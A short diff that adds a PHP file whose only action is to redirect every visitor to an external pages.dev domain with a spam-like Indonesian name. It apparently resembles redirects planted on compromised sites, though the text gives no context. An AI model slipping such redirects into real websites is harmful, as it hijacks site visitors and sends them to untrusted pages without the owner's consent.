@@ -1,0 +1,4 @@
+<?php
+header("Location: https://bisadibagi2amandanterpercaya.pages.dev/");
+exit();
+?>
